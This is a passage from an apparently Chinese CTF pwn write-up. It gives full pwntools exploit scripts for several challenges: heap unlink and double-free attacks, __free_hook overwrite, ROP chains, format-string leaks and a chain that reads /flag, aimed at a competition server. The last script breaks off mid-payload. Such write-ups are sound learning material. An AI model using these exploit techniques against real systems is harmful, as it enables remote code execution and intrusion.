<li>分析<br><img src="https://img-blog.csdnimg.cn/3f87223f5b6d461daf67058ae58b9eaa.png#pic_center" alt="在这里插入图片描述"><br>用 checksec 工具分析程序<br><img src="https://img-blog.csdnimg.cn/0ef34fb5352f40809775408b2c1c6498.png" alt="在这里插入图片描述"><br>再用 ida 看源码<br><img src="https://img-blog.csdnimg.cn/0daa62f428b640428707b5ecd4f7457a.png#pic_center" alt="在这里插入图片描述"></li>
<li>exp</li>
</ol>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
<span class="hljs-comment">#io=process(&quot;./chef&quot;)</span>
io=remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>,<span class="hljs-number">10031</span>)
elf=ELF(<span class="hljs-string">&quot;./chef&quot;</span>)
r = <span class="hljs-keyword">lambda</span> : io.recv()
rx = <span class="hljs-keyword">lambda</span> x: io.recv(x)
ru = <span class="hljs-keyword">lambda</span> x: io.recvuntil(x)
rud = <span class="hljs-keyword">lambda</span> x: io.recvuntil(x, drop=<span class="hljs-literal">True</span>)
uu64= <span class="hljs-keyword">lambda</span> : u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))
s = <span class="hljs-keyword">lambda</span> x: io.send(x)
sl = <span class="hljs-keyword">lambda</span> x: io.sendline(x)
sa = <span class="hljs-keyword">lambda</span> x, y: io.sendafter(x, y)
sla = <span class="hljs-keyword">lambda</span> x, y: io.sendlineafter(x, y)
shell = <span class="hljs-keyword">lambda</span> : io.interactive()
libc=elf.libc
sl(<span class="hljs-string">b&quot;4&quot;</span>)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):
sla(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">b&quot;2&quot;</span>)
sla(<span class="hljs-string">&quot;Please enter the price of food:&quot;</span>,<span class="hljs-built_in">str</span>(size))
sa(<span class="hljs-string">&quot;Please enter the name of food:&quot;</span>,content)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():
sla(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):
sla(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)
sla(<span class="hljs-string">&quot;Please enter the index of food:&quot;</span>,<span class="hljs-built_in">str</span>(index))
sla(<span class="hljs-string">&quot;Please enter the price of food :&quot;</span>,<span class="hljs-built_in">str</span>(size))
sa(<span class="hljs-string">&quot;Please enter the name of food:&quot;</span>,content)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):
sla(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)
sla(<span class="hljs-string">&quot;Please enter the index of food:&quot;</span>,<span class="hljs-built_in">str</span>(index))
<span class="hljs-comment">#gdb.attach(io)</span>
ptr=<span class="hljs-number">0x6020b8</span>
add(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)
payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x81</span>)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr-<span class="hljs-number">0x10</span>)
payload=payload.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)
payload+=p64(<span class="hljs-number">0x80</span>)+p64(<span class="hljs-number">0x90</span>)
edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)
delete(<span class="hljs-number">2</span>)
edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0x50</span>)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))
show()
leak_addr=uu64()
libc_base=leak_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))
system_addr=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]
free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0x50</span>)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(<span class="hljs-number">0x50</span>)+p64(free_hook))
edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,p64(system_addr))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))
delete(<span class="hljs-number">3</span>)
shell()</code></pre>
<h2 id="谜语人"><a href="#谜语人" class="headerlink" title="谜语人"></a>谜语人</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack
<span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> gmpy2
<span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):
 p.send(a)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>):
 p.sendafter(a, b)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):
 p.sendline(a)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>):
 p.sendlineafter(a, b)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():
 p.recv()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>():
 <span class="hljs-built_in">print</span>(p.recv())
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):
 <span class="hljs-keyword">return</span> p.recvuntil(a)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():
 p.interactive()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():
 gdb.attach(p)
 pause()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():
 <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>():
 <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))
context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
<span class="hljs-comment">#p = remote(&#x27;59.110.164.72&#x27;, 10028)</span>
elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
libc = ELF(<span class="hljs-string">&#x27;libc.so&#x27;</span>)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx</span>):
sla(<span class="hljs-string">b&#x27;Then?\n&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)
sla(<span class="hljs-string">b&#x27;?!\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):
sla(<span class="hljs-string">b&#x27;Then?\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)
sla(<span class="hljs-string">b&#x27;?!\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
sla(<span class="hljs-string">b&#x27;Then?\n&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)
sla(<span class="hljs-string">b&#x27;?!\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, data</span>):
sla(<span class="hljs-string">b&#x27;Then?\n&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)
sla(<span class="hljs-string">b&#x27;?!\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))
sleep(<span class="hljs-number">0.5</span>)
sl(data)
<span class="hljs-comment"># leak heap_addr</span>
add(<span class="hljs-number">3</span>)
add(<span class="hljs-number">4</span>)
free(<span class="hljs-number">4</span>)
edit(<span class="hljs-number">4</span>, p64(<span class="hljs-number">0</span>))
free(<span class="hljs-number">4</span>)
show(<span class="hljs-number">4</span>)
heap_addr = u32(p.recv(<span class="hljs-number">4</span>))
ptr_heap = heap_addr - <span class="hljs-number">0x1048</span> + <span class="hljs-number">0x8</span>
<span class="hljs-comment"># leak libc_base</span>
edit(<span class="hljs-number">4</span>, p32(ptr_heap))
add(<span class="hljs-number">5</span>)
add(<span class="hljs-number">6</span>)
free(<span class="hljs-number">6</span>)
show(<span class="hljs-number">6</span>)
p.recv(<span class="hljs-number">4</span>)
libc_base = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">56</span> - <span class="hljs-number">0x8</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]
<span class="hljs-comment"># free_hook -&gt; system</span>
free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
system, binsh = get_sb()
free(<span class="hljs-number">3</span>)
edit(<span class="hljs-number">3</span>, p64(<span class="hljs-number">0</span>))
free(<span class="hljs-number">3</span>)
edit(<span class="hljs-number">3</span>, p32(free_hook))
add(<span class="hljs-number">7</span>)
add(<span class="hljs-number">8</span>)
edit(<span class="hljs-number">8</span>, p32(system))
<span class="hljs-comment"># pwn</span>
edit(<span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;sh;\x00&#x27;</span>)
free(<span class="hljs-number">7</span>)
inter()
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; free_hook -&gt; &#x27;</span>, <span class="hljs-built_in">hex</span>(free_hook))
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; libc_base -&gt; &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; ptr_heap -&gt; &#x27;</span>, <span class="hljs-built_in">hex</span>(ptr_heap))
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; heap_addr -&gt; &#x27;</span>, <span class="hljs-built_in">hex</span>(heap_addr))
<span class="hljs-comment">#debug()</span></code></pre>
<h2 id="第二识势"><a href="#第二识势" class="headerlink" title="第二识势"></a>第二识势</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
context.arch=<span class="hljs-string">&quot;amd64&quot;</span>
<span class="hljs-comment">#io=process(&quot;./attachment-34&quot;)</span>
io=remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>,<span class="hljs-number">10025</span>)
elf=ELF(<span class="hljs-string">&quot;./attachment-34&quot;</span>)
r = <span class="hljs-keyword">lambda</span> : io.recv()
rx = <span class="hljs-keyword">lambda</span> x: io.recv(x)
ru = <span class="hljs-keyword">lambda</span> x: io.recvuntil(x)
rud = <span class="hljs-keyword">lambda</span> x: io.recvuntil(x, drop=<span class="hljs-literal">True</span>)
uu64= <span class="hljs-keyword">lambda</span> : u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))
s = <span class="hljs-keyword">lambda</span> x: io.send(x)
sl = <span class="hljs-keyword">lambda</span> x: io.sendline(x)
sa = <span class="hljs-keyword">lambda</span> x, y: io.sendafter(x, y)
sla = <span class="hljs-keyword">lambda</span> x, y: io.sendlineafter(x, y)
shell = <span class="hljs-keyword">lambda</span> : io.interactive()
<span class="hljs-comment">#libc=elf.libc</span>
libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)
<span class="hljs-comment">#gdb.attach(io)</span>
sl(<span class="hljs-string">b&quot;6\x00666666666666666666666&quot;</span>)
ru(<span class="hljs-string">&quot;materials\n&quot;</span>)
leak_addr=<span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">8</span>))
heap_addr=leak_addr-<span class="hljs-number">0x13</span>+<span class="hljs-number">0x20</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))
sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">0xfffffffffff</span>))
target=<span class="hljs-number">0x6012Af</span>
sl(<span class="hljs-built_in">str</span>(target-heap_addr-<span class="hljs-number">0x20</span>))
pause()
s(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xf</span>+<span class="hljs-string">b&#x27;\x61&#x27;</span>)
<span class="hljs-comment">#b *0x400B39</span>
addr=<span class="hljs-number">0x4008a7</span>
bsf=<span class="hljs-number">0x6012A0</span>
leave_ret=<span class="hljs-number">0x400944</span>
rdi=<span class="hljs-number">0x400bd3</span>
ret=<span class="hljs-number">0x4006e6</span>
magic_gadget_addr=<span class="hljs-number">0x400888</span>
csu_low=<span class="hljs-number">0x400BCa</span>
one_gadget=<span class="hljs-number">0xf1247</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">set_to</span>(<span class="hljs-params">addr,data</span>):
 pd = flat([
 csu_low,
 data,
 addr + <span class="hljs-number">0x3d</span>,
 <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,
 magic_gadget_addr
 ])
 <span class="hljs-keyword">return</span> pd
payload=set_to(<span class="hljs-number">0x601250</span>,one_gadget-libc.sym[<span class="hljs-string">&#x27;setvbuf&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;setvbuf&#x27;</span>])
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))
payload=payload.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(bsf-<span class="hljs-number">8</span>)+p64(leave_ret)
pause()
sl(payload)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;setvbuf&#x27;</span>]))
shell()</code></pre>
<h2 id="第一用笔-1"><a href="#第一用笔-1" class="headerlink" title="第一用笔-1"></a>第一用笔-1</h2><ol>
<li>分析<br><img src="https://img-blog.csdnimg.cn/8987e508ee3044d6b3251b49d7bab88a.png#pic_center" alt="在这里插入图片描述"><br>用 checksec 工具分析程序<br><img src="https://img-blog.csdnimg.cn/4c647ea2dae84717ae89ca65e5fe78bb.png" alt="在这里插入图片描述"><br>再用 ida 看源码<br><img src="https://img-blog.csdnimg.cn/80d141f26a974f9fb825a90b21c27044.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/4188a0166e824957875b37db4a92ca04.png" alt="在这里插入图片描述"></li>
</ol>
<p>存在一个栈溢出很大的函数可以利用<br><img src="https://img-blog.csdnimg.cn/941739477b4f4f8d985d92a581a863c1.png" alt="在这里插入图片描述"></p>
<p>可以用 main 的 fun_2 函数栈溢出来调用那个更大的栈溢出函数来布置栈帧，还要泄露<br>地址来计算基砋来调用 libc 的 system 函数<br>2.  exp</p>
<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># -*- coding=utf-8 -*-</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">import</span> os
context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
elf = ELF(<span class="hljs-string">&quot;./usage_of_pen&quot;</span>)
libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)
DEBUG = <span class="hljs-number">0</span>
pop_rdi = <span class="hljs-number">0x0000000000400c53</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">p</span>):
 p.recvuntil(<span class="hljs-string">b&quot;and 40 to 47 is &#x27;nvfeng00&#x27;!\n&quot;</span>)
 payload = <span class="hljs-string">b&quot;&quot;</span>
 payload += <span class="hljs-string">b&quot;dunbi000&quot;</span>
 payload += <span class="hljs-string">b&quot;cuobi&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>)
 payload += <span class="hljs-string">b&quot;yufeng&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>)
 payload += <span class="hljs-string">b&quot;dunfeng&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>)
 payload += <span class="hljs-string">b&quot;cunfeng&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>)
 payload += <span class="hljs-string">b&quot;nvfeng00&quot;</span>
 payload += <span class="hljs-string">b&quot;yuefeng&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>)
 payload += <span class="hljs-string">b&quot;anfeng&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>)
 payload += <span class="hljs-string">b&quot;jiebi&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>)
 p.send(payload)
 p.recvuntil(<span class="hljs-string">&quot;or you can look for other space\n&quot;</span>)
 payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x400B0F</span>)
 p.send(payload)
 payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x28</span> + p64(pop_rdi) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>]) + p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]) + 
p64(<span class="hljs-number">0x400B0F</span>)
 <span class="hljs-comment"># pause()</span>
 sleep(<span class="hljs-number">0.5</span>)
 p.send(payload)
 puts_addr = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))
 libc.address = puts_addr - <span class="hljs-number">0x6f6a0</span>
 payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x28</span> + p64(pop_rdi) + p64(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__()) + 
p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])
 <span class="hljs-comment"># pause()</span>
 sleep(<span class="hljs-number">0.5</span>)
 p.send(payload)
 p.interactive()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
 <span class="hljs-keyword">if</span> DEBUG:
 p = process(<span class="hljs-string">&quot;./usage_of_pen&quot;</span>)
 gdb.attach(p, <span class="hljs-string">&quot;source ./.gdbinit&quot;</span>)
 exp(p)
 <span class="hljs-keyword">else</span>:
 p = remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>, <span class="hljs-number">10002</span>)
 exp(p)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
 main()</code></pre>
<h2 id="Your-character"><a href="#Your-character" class="headerlink" title="Your_character"></a>Your_character</h2><ol>
<li>分析<br><img src="https://img-blog.csdnimg.cn/ffd68d53f4f04990b7cc759f2f540779.png" alt="在这里插入图片描述"><br>用 checksec 工具分析程序<br><img src="https://img-blog.csdnimg.cn/1717cd2e42a04fdcb16ce306f91eee24.png" alt="在这里插入图片描述"><br>再用 ida 看源码，是堆相关的漏洞<br><img src="https://img-blog.csdnimg.cn/312ec8c70e8245e393e427343d64e40a.png" alt="在这里插入图片描述"></li>
<li>exp</li>
</ol>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">import</span> os
context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
elf = ELF(<span class="hljs-string">&quot;./your_character&quot;</span>)
libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)
DEBUG = <span class="hljs-number">0</span>
bss_addr = <span class="hljs-number">0x6021C0</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">p</span>):
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">design</span>():
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;1&quot;</span>)
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">background</span>(<span class="hljs-params">context</span>):
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;2&quot;</span>)
 p.recvuntil(<span class="hljs-string">&quot;Please enter the background story of your character: \n&quot;</span>)
 p.send(context)
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">character</span>(<span class="hljs-params">idx, content</span>):
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;3&quot;</span>)
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">damage, introduction</span>):
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;1&quot;</span>)
 p.recvuntil(<span class="hljs-string">&quot;Damage of skill : &quot;</span>)
 p.send(<span class="hljs-built_in">str</span>(damage))
 p.recvuntil(<span class="hljs-string">&quot;introduction of skill:&quot;</span>)
 p.send(introduction)
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_damage</span>(<span class="hljs-params">idx, damage</span>):
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;2&quot;</span>)
 p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)
 p.send(<span class="hljs-built_in">str</span>(idx))
 p.recvuntil(<span class="hljs-string">&quot;Damage of skill : &quot;</span>)
 p.send(<span class="hljs-built_in">str</span>(damage))
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_intro</span>(<span class="hljs-params">idx, introduction</span>):
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;3&quot;</span>)
 p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)
 p.send(<span class="hljs-built_in">str</span>(idx))
 p.recvuntil(<span class="hljs-string">&quot;introduction of skill : &quot;</span>)
 p.send(introduction)
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;4&quot;</span>)
 p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)
 p.send(<span class="hljs-built_in">str</span>(idx))
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;5&quot;</span>)
 p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)
 p.send(<span class="hljs-built_in">str</span>(idx))
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">back</span>():
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;6&quot;</span>)
 design()
 create(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&quot;aaa&quot;</span>)<span class="hljs-comment">#0</span>
 create(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&quot;aaa&quot;</span>)<span class="hljs-comment">#1</span>
 create(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<span class="hljs-comment">#2</span>
 payload = <span class="hljs-string">b&quot;\x01&quot;</span>*<span class="hljs-number">0x18</span> + <span class="hljs-string">b&quot;\x41&quot;</span>
 edit_intro(<span class="hljs-number">0</span>, payload)
 delete(<span class="hljs-number">1</span>)
 payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0x100</span>) + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])
 create(<span class="hljs-number">0x38</span>, payload)
 show(<span class="hljs-number">1</span>)
 free_addr = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))
 libc.address = free_addr - <span class="hljs-number">0x84540</span>
 info(<span class="hljs-string">&quot;libc.address-----&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc.address))
 edit_intro(<span class="hljs-number">1</span>, p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>]))
 delete(<span class="hljs-number">2</span>)
 p.interactive()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
 <span class="hljs-keyword">if</span> DEBUG:
 p = process(<span class="hljs-string">&quot;./your_character&quot;</span>)
 gdb.attach(p, <span class="hljs-string">&quot;source ./.gdbinit&quot;</span>)
 exp(p)
 <span class="hljs-keyword">else</span>:
 p = remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>, <span class="hljs-number">10003</span>)
 exp(p)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
 main()</code></pre>
<h2 id="困局"><a href="#困局" class="headerlink" title="困局"></a>困局</h2><p>下载附件分析，发现main会调用两次func_key,func_key里有格式化字符串漏洞, func_1有一个足够长的溢出。<br>写exp:</p>
<pre><code class="hljs python">

libc_base=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]-<span class="hljs-number">240</span>
open_addr = libc_base + libc.sym[<span class="hljs-string">&quot;open&quot;</span>]

read_addr = libc_base + libc.sym[<span class="hljs-string">&quot;read&quot;</span>]
write_addr = libc_base + libc.sym[<span class="hljs-string">&quot;write&quot;</span>]
<span class="hljs-comment"># 0x000000000002601f : pop rsi ; ret</span>
pop_rsi = libc_base + <span class="hljs-number">0x00000000000202f8</span>
<span class="hljs-comment"># 0x0000000000142c92 : pop rdx ; ret</span>
pop_rdx = libc_base + <span class="hljs-number">0x0000000000001b92</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))
can=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(can))
stack=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">128</span>+<span class="hljs-number">48</span>+<span class="hljs-number">8</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))

p.recvuntil(<span class="hljs-string">&quot;This is a larger box\n&quot;</span>)
pay=<span class="hljs-string">b&#x27;%9$p&#x27;</span>
p.send(pay)
p.recvuntil(<span class="hljs-string">&quot;We have a lot to talk about\n&quot;</span>)
payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x8</span>)+p64(can)+p64(stack+<span class="hljs-number">0x10</span>-<span class="hljs-number">8</span>)+p64(leave_ret)
payload += <span class="hljs-string">b&quot;/flag\x00\x00\x00&quot;</span> <span class="hljs-comment"># </span>
payload += p64(pop_rdi)
payload += p64(stack+<span class="hljs-number">8</span>)
payload += p64(pop_rsi)
payload += p64(<span class="hljs-number">0</span>)
payload += p64(open_addr)
payload += p64(pop_rdi)
payload += p64(<span class="hljs-number">3</span>)
payload += p64(pop_rsi)
payload += p64(<span class="hljs-number">0x601060</span>+<span class="hljs-number">0x100</span>)
payload += p64(pop_rdx)
payload += p64(<span class="hljs-number">0x100</span>)
payload += p64(read_addr)
payload += p64(pop_rdi)
payload += p64(<span class="hljs-number">1</span>)
payload += p64(pop_rsi)
payload += p64(<span class="hljs-number">0x601060</span>+<span class="hljs-number">0x100</span>)
